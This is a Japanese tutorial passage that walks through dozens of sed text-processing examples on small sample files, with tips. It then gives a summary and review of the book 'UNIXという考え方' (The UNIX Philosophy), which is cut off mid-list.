sedコマンドで一致するパターンマッチは、「\\1」、「\\2」などで示されます。\n次のsedコマンドは、パターン\u0026rsquo;Bash\u0026rsquo;を検索し、パターンが一致する場合は、テキストを置き換える部分「bash」を\u0026rsquo;\\1\u0026rsquo;として処理をします。\nここでは、入力テキストで「Bash」というテキストが検索され、「\\1」の前に1つのテキストが追加され、後に別のテキストが追加されます。\n$ echo \u0026#34;Bash language\u0026#34; | sed \u0026#39;s/\\(Bash\\)/Learn \\1 programming/\u0026#39; Learn Bash programming language ヒント 難しく考える必要はありません。\u0026rsquo;s/(文字列)/ で文字列を検索します。その後、検索した文字列を \\1 として、文字A \\1 文字B として出力します。 一致する行を削除 \u0026rsquo;d\u0026rsquo;オプションは、ファイルから任意の行を削除するためにsedコマンドで使用されます。os.txtという名前のファイルを作成し、次のコンテンツを追加して、 「d」オプションの機能をテストします。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt | sed \u0026#39;/OS/ d\u0026#39; Windows Linux Android bash-5.1$ ヒント d オプションは、delete（削除）です。 一致する行の後の2行を削除 次のコマンドは、パターン「Linux」が見つかった場合、ファイルos.txtから3行を削除します。os.txtには、2行目に「Linux 」というテキストが含まれています。したがって、この行と次の2行は削除されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt | sed \u0026#39;/Linux/,+2d\u0026#39; Windows テキスト行の最後にあるすべてのスペースを削除 [:blank:]クラス（といいます）を使用すると、テキストまたは任意のファイルのコンテンツからスペースとタブを削除できます。次のコマンドは、ファイルos.txt の各行の終わりにあるスペースを削除します。\n以下のテキストの行末には半角スペースが３つづつついています。（みえないけど）\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os_space.txt Windows Linux Android OS $ $ cat os_space.txt | sed \u0026#39;/^[[:blank:]]*$/d\u0026#39; Windows Linux Android OS 出力されたテキストには、半角スペースが除去されています（みえないけど）\n行で2回一致するすべての行を削除 次の内容のinput.txtという名前のテキストファイルを作成し、検索パターンを含むファイルの行を2回削除します。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. input.txtファイルには一行に「PHP」というワードが２回表示される行が２行あります。\n以下の例では、sedコマンドの -e オプションを使って、sedコマンドを連続して使用し、パターン\u0026rsquo;PHP\u0026rsquo;を含む２行を削除します。\n最初のsedコマンドは、各行の2番目に出現する\u0026rsquo;PHP\u0026rsquo;を\u0026rsquo;dl\u0026rsquo;に置き換え、次のsedコマンド「-e」で、テキスト\u0026rsquo; dl \u0026lsquo;を含む行を「dオプション」で削除します。\n実行結果は以下のとおりです。\ncat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ $ cat input.txt | sed -e \u0026#39;s/php/dl/i2;\u0026#39; -e \u0026#39;/dl/d\u0026#39; PHP is a server-side scripting language. PHP is platform-independent. 空行を削除 この例をテストするには、コンテンツに空の行が含まれているファイルを選択します。前の例で作成されたinput.txtファイルには、次のsedコマンドを使用して削除できる2つの空の行が含まれています。ここで、「^$」は、ファイルinput.txtの空の行を見つけるために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os_blank.txt Windows Linux Android OS $ cat os_blank.txt | sed \u0026#39;/^$/d\u0026#39; Windows Linux Android OS ヒント ^$ は 行頭（^)と行末（$)の間になにもない（空行）という意味になります。ものすごく良く使います。 出力できない文字をすべて削除 出力できない文字をnoneに置き換えることにより、出力できない文字を任意のテキストから削除できます。\nこの例では、[:print:]クラスを使用して、出力できない文字を検索します。\u0026rsquo;\\ t\u0026rsquo;は出力できない文字なので、echoコマンドで直接解析することはできません。\n以下のコマンドを実行すると、「echo」コマンドで使用される変数$tabに「\\t」文字が混入しても、sedコマンドで[:print:]に該当する文字\u0026rsquo;\\t\u0026rsquo;が削除されます。\n実行結果は以下のとおりです。\n$ tab=$\u0026#39;\\t\u0026#39; $ echo Hello\u0026#34;$tab\u0026#34;World Hello\tWorld $ echo Hello\u0026#34;$tab\u0026#34;World | sed \u0026#39;s/[^[:print:]]//g\u0026#39; HelloWorld $ ヒント 上記のコマンドを実行すると、次の出力が表示されます。最初のechoコマンドはTAB付きで出力し、sedコマンドの[^[:print:]]出力できない文字であるタブスペースを削除し出力します。 一致した場合行末に文字列を追加 次のsedコマンドは、 os.txtファイルのテキスト「Windows」を含む行の最後に「10」を追加します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/Windows/ s/$/ 10/\u0026#39; Windows 10 Linux Android OS 一致した場合行前に行を挿入 次のsedコマンドは、前に作成されたinput.txtファイルの「PHP is platform-independent」というテキストを検索します。ファイルのいずれかの行にこのテキストが含まれている場合、「PHP is an interpreted language」がその行の前に挿入されます。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\ncat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ cat input.txt | sed \u0026#39;/PHP is platform-independent/ s/^/PHP is an interpreted language.\\n/\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is an interpreted language. PHP is platform-independent. 一致したら一致行の下に文字列を挿入 次のsedコマンドは、ファイルos.txt内のテキスト\u0026rsquo; Linux\u0026rsquo;を検索し、テキストがいずれかの行に存在する場合は、新しいテキスト\u0026rsquo; Ubuntu \u0026lsquo;がその行の後に挿入されます。\nWindows Linux Android OS 実行結果は以下のとおりです\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/Linux/\u0026amp;\\nUbuntu/\u0026#39; Windows Linux Ubuntu Android OS $ ヒント \u0026amp;\\n が自分自身の行のあとに改行という意味になります。 一致しない場合は行末に文字列を追加 次のsedコマンドは、os.txt内でテキスト「Linux」を含まない行を検索し、各行の最後にテキスト「Operating System」を追加します。ここで、「$」記号は、新しいテキストが追加される行を識別するために使用されます。\nWindows Linux Android OS $ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/Linux/! s/$/ Operating System/\u0026#39; Windows Operating System Linux Android Operating System OS Operating System ヒント /Linux/! で、Linuxという文字列が行になければという意味、$は行末を意味します。Operation Systemの戦闘に空白が有るのがミソです。 一致しない行を削除 web.txtという名前のファイルを作成し、次のコンテンツを追加して、一致するパターンを含まない行を削除します。\nHTML5 JavaScript CSS PHP MySQL JQuery 次のsedコマンドは、テキスト「CSS」を含まない行を検索して削除します。\n実行結果は以下のとおりです。\n$ cat web.txt HTML5 JavaScript CSS PHP MySQL JQuery $ $ cat web.txt | sed \u0026#39;/CSS/!d\u0026#39; CSS 上記のコマンドを実行すると、次の出力が表示されます。\u0026lsquo;CSS\u0026rsquo;というテキストを含むファイルに1行あります。したがってCSSを含む1行だけが出力され、CSSを含まない行は削除されます。\nテキストの後にスペースを追加した後、一致したテキストを複製する 次のsedコマンドは、ファイルpython.txt内の\u0026rsquo;to\u0026rsquo;という単語を検索します。その単語が存在する場合は、スペースを追加して、同じ単語が検索単語の後に挿入されます。ここでは、「\u0026amp;」記号を使用して重複テキストを追加しています。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ cat python.txt Python is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ $ cat python.txt | sed -e \u0026#39;s/to /\u0026amp; to/g\u0026#39; Python is a very popular language. Python is easy to touse. Python is easy to tolearn. Python is a cross-platform language $ ヒント 意味のないサンプルとなりましたが、このコマンドを実行すると、「to」という単語がファイルpython.txtで検索され、この単語はこのファイルの2行目に存在することがわかります。結果、一致するテキストの後にスペースを含む「to 」が追加されます。 文字列のリストの1つを新しい文字列に置き換える この例をテストするには、2つのリストファイルを作成する必要があります。\n1001 =\u0026gt; Jafar Ali 1023 =\u0026gt; Nir Hossain 1067 =\u0026gt; John Michel 1001 CSE GPA-3.63 1002 CSE GPA-3.24 1023 CSE GPA-3.11 1067 CSE GPA-3.84 次のsedコマンドは、上記の2つのテキストファイルの最初の列と一致し、一致するテキストをファイルlist1.txtの3番目の列の値に置き換えます。\n実行結果は以下のとおりです。\n$ cat list1.txt 1001 =\u0026gt; Jafar Ali 1023 =\u0026gt; Nir Hossain 1067 =\u0026gt; John Michel $ $ cat list2.txt 1001 CSE GPA-3.63 1002 CSE GPA-3.24 1023 CSE GPA-3.11 1067 CSE GPA-3.84 $ $ sed `cat list1.txt | awk \u0026#39;{print \u0026#34;-e s/\u0026#34;$1\u0026#34;/\u0026#34;$3\u0026#34;/\u0026#34;}\u0026#39;`\u0026lt;\u0026lt;\u0026lt;\u0026#34;` cat list2.txt`\u0026#34; Jafar CSE GPA-3.63 1002 CSE GPA-3.24 Nir CSE GPA-3.11 John CSE GPA-3.84 ヒント list1.txtファイルの1001、1023、1067は、list2.txtファイルの3つのデータと一致し、これらの値は、list1.txtの3番目の列の対応する名前に置き換えられます。 一致した文字列を改行を含む文字列に置き換える 次のコマンドは、 echoコマンドから入力を受け取り、テキスト内の「Python」という単語を検索します。単語がテキストに存在する場合、新しいテキスト「Added Text」が改行で挿入されます。\n$ echo \u0026#34;Bash Perl Python Java PHP ASP\u0026#34; | sed \u0026#39;s/Python/Added Text\\n/\u0026#39; Bash Perl Added Text Java PHP ASP ファイルから改行を削除し各行の最後にカンマを挿入 次のsedコマンドは、ファイルos.txtの各改行をカンマに置き換えます。ここで、-zオプションは、行をNULL文字で区切るために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed -z \u0026#39;s/\\n/,/g\u0026#39; Windows,Linux,Android,OS,$ カンマを削除し、改行を追加して、テキストを複数の行に分割 次のsedコマンドは、echoコマンドからカンマで区切られた行を入力として受け取り、カンマを改行に置き換えます。\n$ echo \u0026#34;Kaniz Fatema,30th,batch\u0026#34; | sed \u0026#34;s/,/\\n/g\u0026#34; Kaniz Fatema 30th batch ヒント 上記のコマンドを実行すると、入力テキストのカンマは改行に置き換えられ3行で出力されます。 大文字と小文字を区別しない一致を検索し、行を削除 次のsedコマンド\u0026rsquo;I\u0026rsquo;は、大文字と小文字を区別しないオプションです。一致で大文字と小文字を無視することを示します。\n次のsedコマンドは、「linux」という単語を大文字小文字を区別せずに検索し、 os.txtファイルからその行を削除します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/linux/Id\u0026#39; Windows Android OS 大文字と小文字を区別しない一致を見つけて、新しいテキストに置き換える 次のsedコマンドは、echoコマンドからの入力を受け取り、単語\u0026rsquo;bash\u0026rsquo;を単語\u0026rsquo;PHP\u0026rsquo;に置き換えます。\n「Bash」という単語は、大文字と小文字を区別しない検索のために「bash」という単語と一致し、「PHP」という単語に置き換えられています。\n$ echo \u0026#34;I like bash programming \u0026#34; | sed \u0026#39;s/Bash/PHP/i\u0026#39; I like PHP programming 大文字と小文字を区別しない一致を見つけて、同じテキストのすべて大文字に置き換える \u0026lsquo;\\U\u0026rsquo;は、テキストをすべて大文字に変換します。次のsedコマンドは、 os.txtファイル内の単語\u0026rsquo;linux\u0026rsquo;を大文字小文字を区別せずに検索し、単語が存在する場合は、単語をすべて大文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;s/\\(linux\\)/\\U\\1/Ig\u0026#39; Windows LINUX Android OS 大文字と小文字を区別しない一致を見つけて、同じテキストのすべての小文字に置き換える \u0026lsquo;\\L\u0026rsquo;はsedで使用され、テキストをすべて小文字に変換します。次のsedコマンドは、os.txtファイルの「Linux」という単語を検索し、その単語をすべて小文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;s/\\(linux\\)/\\L\\1/Ig\u0026#39; Windows linux Android OS テキスト内のすべての大文字を小文字に置き換える 次のsedコマンドは、os.txtファイル内のすべての大文字を検索し、「\\L」を使用して文字を小文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/\\(.*\\)/\\L\\1/\u0026#39; windows linux android os 行の番号を検索し、番号の後に通貨記号を追加 以下のファイルを準備します。\nHDD 100 Monitor 80 Mouse 10 実行結果は以下の通りです。\n$ cat items.txt HDD 100 Monitor 80 Mouse 10 $ $ cat items.txt | sed \u0026#39;s/\\([0-9]\\)/$\\1/\u0026#39; HDD $100 Monitor $80 Mouse $10 上記のコマンドを実行すると、次の出力が表示されます。ここでは、各行の番号の前に「$」記号が追加されています。\n3桁を超える数値にカンマを追加 次のsedコマンドは、 echoコマンドからの入力として数値を受け取り、右から数えて3桁の各グループの後にカンマを追加します。ここで、「：a」はラベルを示し、「ta」はグループ化プロセスを繰り返すために使用されます。\n$ echo \u0026#34;5098673\u0026#34; | sed -e :a -e \u0026#39;s/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta\u0026#39; 5,098,673 ヒント ようするに桁区切りをsedコマンドで実現するということです。 タブ文字を4つのスペース文字に置き換えます 次のsedコマンドは、各タブ（\\ t）文字を4つのスペース文字に置き換えます。「$」記号は「sed」コマンドでタブ文字と一致するように使用され、「g」はすべてのタブ文字を置き換えるために使用されます。\n実行結果は以下のとおりです。\\tという文字列が\n$ echo -e \u0026#34;1\\t2\\t3\u0026#34; | sed $\u0026#39;s/\\t/ /g\u0026#39; 1 2 3 4つの連続するスペース文字をタブ文字に置き換えます 次のコマンドは、4つの連続する文字をタブ（\\ t）文字に置き換えます。\n$ echo -e \u0026#34;1 2\u0026#34; | sed $\u0026#39;s/ /\\t/g\u0026#39; 1\t2 すべての行を最初の80文字に切り捨てます この例をテストするには、80文字を超える行を含むin.txtという名前のテキストファイルを作成します。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ cat in.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive.PHP is platform-independent. $ $ cat in.txt | sed \u0026#39;s/\\(^.\\{1,80\\}\\).*/\\1/\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive.PHP is platform-indepen ヒント 上記のコマンドを実行すると、次の出力が表示されます。in.txtファイルの2行目には、80文字を超える文字が含まれており、この行は出力で切り捨てられます。 文字列の正規表現を検索し、その後に標準テキストを追加 次のsedコマンドは、入力テキスト内のテキスト\u0026rsquo; hello \u0026lsquo;を検索し、そのテキストの後にテキスト\u0026rsquo; John \u0026lsquo;を追加します。\n実行結果は以下のとおりです。\n$ echo \u0026#34;hello, how are you?\u0026#34; | sed \u0026#39;s/\\(hello\\)/\\1 John/\u0026#39; hello John, how are you? 文字列の正規表現と、その後に見つかった文字列の2番目のコピーを検索します 次のsedコマンドは、 input.txtの各行のテキスト「 PHP 」を検索し、各行の2番目の一致をテキスト「NewTextAdded」に置き換えます。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\n$ cat input.txt | sed \u0026#39;s/\\(PHP\\)/\\1 (New Text added)/2\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP (New Text added) is case-sensitive. PHP is platform-independent. ヒント 上記のコマンドを実行すると、次の出力が表示されます。検索テキスト「PHP 」は、 input.txtファイルの2行目と3行目に2回表示されます。そのため、2行目と3行目に「NewTextadded」というテキストが挿入されます。 ファイルからの複数行のsedスクリプトの実行 複数のsedスクリプトをファイルに保存し、sedコマンドを実行することですべてのスクリプトを一緒に実行できます。\u0026lsquo;sedcmd \u0026lsquo;という名前のファイルを作成し、次のコンテンツを追加します。ここでは、2つのsedスクリプトがファイルに追加されています。1つのスクリプトがテキスト「PHP」を「ASP」に置き換えます。別のスクリプトがテキスト「独立」をテキスト「依存」に置き換えます。\ns/PHP/ASP/ s/independent/dependent/ PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\n$ cat sedcmd s/PHP/ASP/ s/independent/dependent/ $ $ cat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ $ cat input.txt | sed -f sedcmd ASP is a server-side scripting language. ASP is an open-source language and PHP is case-sensitive. ASP is platform-dependent. ヒント 同様の検索ルールを別ファイルにしておくことで、何度も同じルールを書くことをしなくてすみます。必要なときにファイルを読み出せばよいわけです。 複数行のパターンに一致し、新しい複数行のテキストに置き換える 次のsedコマンドは、複数行のテキスト\u0026rsquo;Linux \\ nAndroid\u0026rsquo;を検索し、パターンが一致する場合、一致する行は複数行のテキスト\u0026rsquo; Ubuntu \\nAndroidLollipop\u0026rsquo;に置き換えられます。ここで、PとDはマルチライン処理に使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;$!N;s/Linux\\nAndroid/Ubuntu\\nAndoid Lollipop/;P;D\u0026#39; Windows Ubuntu Andoid Lollipop OS ヒント わけがわかりませんね。http://blog.livedoor.jp/morituri/archives/52036613.html　こちらを参考に。検索文字列は「sed Nコマンド」です。 パターンに一致する2つの単語の順序を置き換えます 次のsedコマンドは、 echoコマンドから2つの単語の入力を受け取り、これらの単語の順序を置き換えます。\n実行結果は以下のとおりです。\n$ echo \u0026#34;perl python\u0026#34; | sed -e \u0026#39;s/\\([^ ]*\\) *\\([^ ]*\\)/\\2 \\1/\u0026#39; python perl コマンドラインから複数のsedコマンドを使用する \u0026lsquo;-e\u0026rsquo;オプションは、コマンドラインから複数のsedスクリプトを実行するためにsedコマンドで使用されます。次のsedコマンドは、 echoコマンドからの入力としてテキストを受け取り、「Ubuntu」を「Kubuntu」に、「Centos」を「Fedora」に置き換えます。\n実行結果は以下のとおりです。\n$ echo \u0026#34;Ubuntu Centos Debian\u0026#34; | sed -e \u0026#39;s/Ubuntu/Kubuntu/; s/Centos/Fedora/\u0026#39; Kubuntu Fedora Debian sedを他のコマンドと組み合わせる 次のコマンドは、sedコマンドとcatコマンドを組み合わせたものです。最初のsedコマンドはos.txtファイルから入力を受け取り、テキスト\u0026rsquo;\u0026lsquo;Linux\u0026rsquo;を\u0026rsquo;Fedora\u0026rsquo;に置き換えた後、コマンドの出力を2番目のsedコマンドに送信します。2番目のsedコマンドは、テキスト「Windows」を「Windows10」に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/Linux/Fedora/\u0026#39;| sed \u0026#39;s/windows/Windows 10/i\u0026#39; Windows 10 Fedora Android OS ヒント sedの連結は以下のように書くことができます。 $ cat os.txt | sed -e \u0026#39;s/Linux/Fedora/\u0026#39; -e \u0026#39;s/windows/Windows 10/i\u0026#39; Windows 10 Fedora Android OS bash-5.1$ ヒント sed -e と書くことで、パイプで渡すことなく、sedコマンドを連続して使うことができます。 ファイルに空の行を挿入 次の内容のstdlist.txtを作成します。\n#ID #Name [ 101 ] -Ali [ 102 ] -Neha 「G」オプションは、ファイルに空の行を挿入するために使用されます。次のsedコマンドは、 stdlistファイルの各行の後に空の行を挿入します。\n実行結果は以下のとおりです。\n$ cat stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha $ $ sed G stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha ヒント 一見、使われそうなGオプションですが、使うシチュエーションに出会ったことがありません。 ファイルの各行からすべての英数字を削除 次のコマンドは、 stdlistファイル内のすべての英数字をスペースに置き換えます。\n#ID #Name [ 101 ] -Ali [ 102 ] -Neha 実行結果は以下のとおりです。\n$ cat stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha $ $ cat stdlist.txt | sed \u0026#39;s/[A-Za-z0-9]//g\u0026#39; # # [ ] - [ ] - $ 「\u0026amp;」を使用して文字列と一致させる 次のコマンドは、「L」で始まる単語を検索し、「Matched String is –」を「\u0026amp;」記号を使用して一致した単語に追加することでテキストを置き換えます。ここで、「p」は変更されたテキストを出力するために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed -n \u0026#39;s/^L/Matched String is - \u0026amp;/p\u0026#39; Matched String is - Linux 単語のペアを切り替える 各行に単語のペアを含む次のコンテンツを含むcourse.txtという名前のテキストファイルを作成します。\nPHP ASP MySQL Oracle CodeIgniter Laravel 実行結果は以下のとおりです。\n$ cat course.txt PHP ASP MySQL Oracle CodeIgniter Laravel $ $ cat course.txt | sed \u0026#39;s/\\([^ ]*\\) *\\([^ ]*\\)/\\2 \\1/\u0026#39; ASP PHP Oracle MySQL Laravel CodeIgniter $ 各単語の最初の文字を大文字に変換する 次のsedコマンドは、 echoコマンドから入力テキストを受け取り、各単語の最初の文字を大文字に変換します。\n$ echo \u0026#34;I like bash programming\u0026#34; | sed \u0026#39;s/\\([a-z]\\)\\([a-zA-Z0-9]*\\)/\\u\\1\\2/g\u0026#39; I Like Bash Programming ヒント ここまでくると、カルト級ですね。使いこなせる人がいればほぼ神業ですね。 ファイルの行番号を出力する \u0026lsquo;=\u0026lsquo;記号は、ファイルの各行の前に行番号を出力するためにsedコマンドで使用されます。次のコマンドは、os.txtファイルの内容を行番号とともに出力します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt |sed \u0026#39;=\u0026#39; 1 Windows 2 Linux 3 Android 4 OS ヒント できれば行頭に行番号が来てほしいですね。工夫して頑張って作ってみてください。 $ cat os.txt | sed \u0026#39;=\u0026#39; | sed \u0026#39;N;s/\\n/ /\u0026#39; ヒント 楽しめましたか？では 【名著紹介】「UNIXという考え方」 これほどまでシンプルに「UNIX/Linuxとは」について書かれた本はない。\n「エンジニアとしての信念はUNIXである」とはどういうことなのか。「プログラマとしてのコンセプトはLinuxなのだ」とはどういうことなのか。\nそうした、少し偏屈なエンジニアに読んでもらいたい。また、UNIX/Linuxに興味を持っている若者の手にとってもらいたい。\n安心してほしい。旅のしおり程度の大きさで厚さは文庫本の半分にも満たない。しかしその中身は、多くのエンジニアを下支えしてきたUNIXという骨について、わかりやすく、かんたんに、そして記憶に残るかずかずの珠玉の言葉を添えしっかりと書かれている。\n稚拙ではあるが、ざっくりと要点も付け加えたので興味を持ってもらえたなら、ネット通販などでお買い求めいただきたい。\nエンジニアには必須の名著一冊、ここに紹介する。\nUNIXという考え方 「UNIXという考え方」\n著者 Mike Gancarz 著、芳尾 桂 監訳\n定価 1,760円 （本体1,600円＋税）\n判型 A5\n頁 168頁\nISBN 978-4-274-06406-7\n発売日 2001/02/24\n発行元 オーム社\nUNIX的なものの考え方とは何か？ UNIXをUNIXらしく使いこなしたい、UNIXらしいプログラムを作りたい人のための一冊です。\nOSの背後にある哲学を、9つの定理と平易な言葉で説く\nOSを使いこなすためには、その背後にある「哲学」を理解することが必要です。本書では技術的詳細には立ち入らず、その代わりに、今まで文章で表されることが少なかったUNIXの考え方を、9つの「定理」にまとめて平易な言葉で明らかにしています。\n定理1：スモール・イズ・ビューティフル\n定理2：一つのプログラムには一つのことをうまくやらせる\n定理3：できるだけ早く試作を作成する\n定理4：効率より移植性\n定理5：数値データはASCIIフラットファイルに保存する\n定理6：ソフトウェアの挺子を有効に活用する\n定理7：シェルスクリプトを使うことで挺子の効果と移植性を高める\n定理8：過度の対話的インタフェースを避ける\n定理9：すべてのプログラムをフィルタにする\nこのような方におすすめ UNIX系OSのユーザ、プログラマ。UNIXの世界観に興味のある人\n主要目次 イントロダクション\n第1章　UNIXの考え方：たくさんの登場人物たち\n第2章　人類にとっての小さな一歩\n第3章　楽しみと実益をかねた早めの試作\n第4章　移植性の優先順位\n第5章　これこそ挺子の効果!\n第6章　対話的プログラムの危険性\n第7章　さらなる10の小定理\n第8章　一つのことをうまくやろう\n第9章　UNIXと他のオペレーティングシステムの考え方\n詳細目次 第1章　UNIXの考え方：たくさんの登場人物たち\n1.1 UNIXの考え方：簡単なまとめ\n第2章　人類にとっての小さな一歩\n2.1 定理1：スモール・イズ・ビューティフル\n2.2 やさしいソフトウェア工学\n2.3 定理2：一つのプログラムには一つのことをうまくやらせる\n第3章　楽しみと実益をかねた早めの試作\n3.1 定理3：できるだけ早く試作を作成する\n3.2 人間による三つのシステム\n3.3 人間による第一のシステム\n3.4 人間による第二のシステム\n3.5 人間による第三のシステム\n3.6 第三のシステムの構築\n第4章　移植性の優先順位\n4.1 定理4：効率より移植性\n4.2 事例研究——Atari 2600\n4.3 定理5：数値データはASCIIフラットファイルに保存する\n4.4 事例研究——あるUNIXプログラマの道具袋\n第5章　これこそ挺子の効果!\n5.1 定理6：ソフトウェアの梃子を有効に活用する\n5.2 定理7：シェルスクリプトを使うことで梃子の効果と移植性を高める\n第6章　対話的プログラムの危険性\n6.1 定理8：過度の対話的インタフェースを避ける\n6.2 定理9：すべてのプログラムをフィルタにする\n6.3 UNIX環境：プログラムをフィルタとして使う\n第7章　さらなる10の小定理\n7.1 (1) 好みに応じて自分で環境を調整できるようにする\n7.2 (2) オペレーティングシステムのカーネルを小さく軽くする\n7.3 (3) 小文字を使い、短く\n7.4 (4) 木を守る\n7.5 (5) 沈黙は金\n7.6 (6) 並行して考える\n7.7 (7) 部分の総和は全体よりも大きい\n7.8 (8) 90パーセントの解を目指す\n7.9 (9) 劣るほうが優れている\n7.10 (10) 階層的に考える\n第8章　一つのことをうまくやろう\n8.1 UNIXの考え方：総括\n第9章　UNIXと他のオペレーティングシステムの考え方\n9.1 Atariホームコンピュータ——芸術としての人間工学\n9.2 MS-DOS——7000万人以上のユーザが間違っているはずがない\n9.3 OpenVMS——UNIXへのアンチテーゼ？\nざっくりななめよみ、鈴木めも 小さいものは美しい　「スモールイズビューティフル」 小さなプログラムはわかりやすい\n小さなプログラムは保守しやすい\n小さなプログラムはシステムリソースに易しい\n小さなプログラムは他のツールと組み合わせやすい\n「伝統的なプログラマは、巨大なアメリカンプログラムによって、\n世界中の全ての問題を一つのプログラムで解決しようとする。」\n「プログラムの９０％はクズである。\nただしあらゆるものの９０％はクズである。」\nパラメータが一行に収まらない\nメソッドが画面に収まらない\nコメントを読まないと何をやっているのか思い出せない\nlsでモジュール名が多すぎて画面の端から消えていってしまう\nまだ開発中なのにエラーメッセージの意味を思い出せない\n整理するためにソースコードを出力している自分に気がついた\n一つのプログラムには一つの事をうまくやらせる　「わかることは分けること」 「UNIXユーザーは、自分が何をしているのかをわかっている。\n何をしているのかわからないのなら、ここにいるべきではない」\n「一つの事をうまくやるようにプログラムを作れないのであれば、\nおそらく問題をまだ完全に理解していない。」\na)ユーザーとの対話が必要か。パラメータではだめか\nb)入力データは特殊フォーマットが必要か。フォーマット変換プログラムがすでにシステム上にないか。\nc)出力データは特殊フォーマットが必要か。通常のASCIIファイルではだめか。\nd)新しいプログラムを書かずとも似たような機能を持つ他のプログラムがあるのではないか。\n「一つの事をうまくやるようにプログラムを作れないのであれば、\nおそらく問題をまだ完全に理解していない。」\n「しのびよる多機能主義。\nプログラマはいつだってプログラムを遅くする方法を見つける。」\n一つの事をうまくやるようにアプリケーションを書けば、それは必然的に小さなプログラムになる。\n小さなプログラムは単一機能になる傾向があり、単一機能のプログラムは小さくなる傾向がある。\n出来るだけ早く試作する　「反復と協調」 「試作によって学ぶ。早い試作はリスクを減らす。\n「正しく」やっている時間などない」\n「「なにができるか」\nむしろ重要な事は、「なにができないか」を知る事だ。」\n三つのシステム\n１．第一のシステム\n第一のシステムは正しくやっている時間などない。\n第一のシステムは追い詰められた人間が作る。\n第一のシステムのコンセプトは人々の想像力を刺激する。\n第一のシステムは一人かせいぜい数人からなる小さなグループで作られる。\n第一のシステムは高い情熱によって推進され開発は急速に進む。\n第一のシステムは実に性能がよい。\n２．第二のシステム\n第二のシステムは第一のシステムで証明されたアイデアを継承する。\n第二のシステムは委員会が設計する。\n第二のシステムは委員会によりものごとを全て公開の場で自分自身の正当化のために議論を進める。\n第二のシステムは第一のシステムの成功に便乗し分け前にあずかろうとする自称専門家で作られる。\n第二のシステムは自称専門家によりリポジトリ、進捗管理ツールが導入され計画は遅延する。\n第二のシステムは自称専門家のプログラムにおきかえられ贅肉がつき象のようにゆっくり動く。\n第二のシステムは「最初の設計のひどい欠点を見違えるように改善」され多機能となり無知が使う。\n第二のシステムは三つのシステムの中で最悪のシステムである。\n３．第三のシステム\n第三のシステムはこれまでのシステムへの反抗から生まれる。\n第三のシステムの名前が変わり、オリジナルのアイデアはもはや常識となる。\n第三のシステムは第一と第二のシステムの最良の特徴を組み合わせる。\n第三のシステムは設計者にとってようやく「正しく」やる事が出来る。\n第三のシステムはユーザーが実際に使用する機能しか含まれない。\n第三のシステムはディスク、メモリ、CPUサイクルなど最適なバランスが実現されている。\n第三のシステムは提供される性能レベルも良くバランスがとれている。\n第一のシステムとして「試作」を１ナノ秒でも早く作り、\n第一のシステムと第二のシステムのサイクルを反復と協調し、\n第三のシステムに向かって協力しながら進んでいく。\n効率より移植性　bashとawkとsed 「最も効率の良い方法は、\nほとんどの場合「移植性」に欠ける。」\n「移植か死か。優れたソフトウェアは移植され成長し、\nそれ以外は取り残され捨てられる。」\nUNIXにおいてそれはシェルスクリプトしかない。\n次のハードウェアはもっと速く走る。だからプログラムを速くするという誘惑に負けない。\nわずかな速度を求めてCで書き直さない。それは時間の無駄だ。\nシェルスクリプトをあれこれいじる余裕が一瞬でも生じればほとんどのプログラマは\na) 新しい機能をいくつか付け加えようとする\nb) スクリプトそのものを洗練し、実行速度を高めようとする\nc) 